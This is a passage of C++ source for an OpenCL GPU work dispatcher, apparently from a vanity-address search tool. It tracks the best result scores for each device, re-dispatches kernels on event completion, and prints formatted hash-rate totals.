		{
			result& r = d.m_memResult[i];
			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax6)
				{
					m_clScoreMax6 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax6 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}
				break;
			}
		}
	}
	else if (d.m_index ==7) {
		for (auto i = PROFANITY_MAX_SCORE; i > m_clScoreMax7; --i)
		{
			result& r = d.m_memResult[i];
			if (r.found > 0 && i >= d.m_clScoreMax)
			{
				d.m_clScoreMax = i;
				CLMemory<cl_uchar>::setKernelArg(d.m_kernelScore, 4, d.m_clScoreMax);
				std::lock_guard<std::mutex> lock(m_mutex);
				if (i >= m_clScoreMax7)
				{
					m_clScoreMax7 = i;
					if ((m_clScoreQuit && i >= m_clScoreQuit) || m_clScoreMax7 >= PROFANITY_MAX_SCORE)
					{
						m_quit = true;
					}
					printResultX(d.m_clSeed, d.m_round, d.m_clSeed.s0, r, i, timeStart, m_mode, m_outputFile, m_postUrl);
				}
				break;
			}
		}
	}
}

void Dispatcher::onEvent(cl_event event, cl_int status, Device &d)
{
	if (status != CL_COMPLETE)
	{
		std::cout << "Dispatcher::onEvent - Got bad status: " << status << std::endl;
	}
	else if (d.m_eventFinished != NULL)
	{
		initContinue(d);
	}
	else
	{
		++d.m_round;
		handleResult(d);
		bool bDispatch = true;
		{
			std::lock_guard<std::mutex> lock(m_mutex);
			d.m_speed.sample(m_size);
			printSpeed();

			if (m_quit)
			{
				bDispatch = false;
				if (--m_countRunning == 0)
				{
					clSetUserEventStatus(m_eventFinished, CL_COMPLETE);
				}
			}
		}

		if (bDispatch)
		{
			dispatch(d);
		}
	}
}

void Dispatcher::printSpeed()
{
	++m_countPrint;
	if (m_countPrint > m_vDevices.size())
	{
		std::string strGPUs;
		double speedTotal = 0;
		unsigned int i = 0;
		int COUNT = 0;
		for (auto &e : m_vDevices)
		{
			COUNT++;
			const auto curSpeed = e->m_speed.getSpeed();
			speedTotal += curSpeed;
			strGPUs += " GPU" + toString(e->m_index) + ": " + formatSpeed(curSpeed);
			++i;
		}

		const std::string strVT100ClearLine = "\33[2K\r";
		if (COUNT > 3) {
			std::cerr << strVT100ClearLine << "Total: " << formatSpeed(speedTotal) << '\r' << std::flush;
		}
		else {
			std::cerr << strVT100ClearLine << "Total: " << formatSpeed(speedTotal) << " -" << strGPUs << '\r' << std::flush;
		}
		
		m_countPrint = 0;
	}
}

void CL_CALLBACK Dispatcher::staticCallback(cl_event event, cl_int event_command_exec_status, void *user_data)
{
	//Device *const pDevice = static_cast<Device *>(user_data);
	Dispatcher::Device* dv = static_cast<Dispatcher::Device*>(user_data);
	//Device cc
	dv->m_parent.onEvent(event, event_command_exec_status, *dv);
	clReleaseEvent(event);
}

std::string Dispatcher::formatSpeed(double f)
{
	const std::string S = " KMGT";

	unsigned int index = 0;
	while (f > 1000.0f && index < S.size())
	{
		f /= 1000.0f;
		++index;
	}
	std::ostringstream ss;
	ss << std::fixed << std::setprecision(3) << (double)f << " " << S[index] << "H/s";
	return ss.str();
}
